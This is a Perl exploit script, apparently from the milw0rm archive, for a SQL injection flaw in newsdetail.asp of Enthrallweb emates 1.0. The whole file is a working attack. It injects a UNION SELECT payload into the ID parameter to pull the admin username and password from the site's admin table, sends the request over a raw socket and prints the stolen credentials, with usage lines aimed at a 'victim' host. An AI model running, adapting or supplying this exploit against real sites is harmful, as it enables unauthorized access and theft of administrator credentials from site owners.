#!/usr/bin/perl
#[Script Name: Enthrallweb emates 1.0 (newsdetail.asp) Remote SQL Injection Exploit
#[Coded by   : ajann
#[Author     : ajann
#[Contact    : :(
#[S.Page     : http://www.enthrallweb.us
#[$$         : 119.40  USD
#[..         : ajann,Turkey

use IO::Socket;
if(@ARGV < 3){
print "
[========================================================================
[//  Enthrallweb emates 1.0 (newsdetail.asp) Remote SQL Injection Exploit
[//                   Usage: exploit.pl [target] [path]
[//                   Example: exploit.pl victim.com /
[//                   Example: exploit.pl victim.com /path/
[//                           Vuln&Exp : ajann
[========================================================================
";
exit();
}
#Local variables
$server = $ARGV[0];
$server =~ s/(http:\/\/)//eg;
$host = "http://".$server;
$port = "80";
$dir = $ARGV[1];
$file = "/newsdetail.asp?ID=";
$target = "-1%20union%20select%200,admin_username,admin_password,0,0%20from%20admin%20where%20id%20like%20".$ARGV[2];
$target = $host.$dir.$file.$target;

#Writing data to socket
print "+**********************************************************************+\n";
print "+ Trying to connect: $server\n";
$socket = IO::Socket::INET->new(Proto => "tcp", PeerAddr => "$server", PeerPort => "$port") || die "\n+ Connection failed...\n";
print $socket "GET $target HTTP/1.1\n";
print $socket "Host: $server\n";
print $socket "Accept: */*\n";
print $socket "Connection: close\n\n";
print "+ Connected!...\n";
#Getting
while($answer = <$socket>) {
if ($answer =~ /<\/b><font color=\"#FFFFFF\" size=\"1\" face=\"Verdana, Arial, Helvetica, sans-serif\">(.*?)<\/font>/){ 
print "+ Exploit succeed! Getting admin information.\n";
print "+ ---------------- +\n";
print "+ Username: $1\n";
}

if ($answer =~ /<b><font color=\"#FFFFFF\" size=\"1\" face=\"Verdana, Arial, Helvetica, sans-serif\">(.*?)<\/font>/){ 
print "+ Password: $1\n";
}

if ($answer =~ /Syntax error/) { 
print "+ Exploit Failed : ( \n";
print "+**********************************************************************+\n";
exit(); 
}

if ($answer =~ /Internal Server Error/) {
print "+ Exploit Failed : (  \n";
print "+**********************************************************************+\n";
exit(); 
}
 }

# milw0rm.com [2006-12-23]
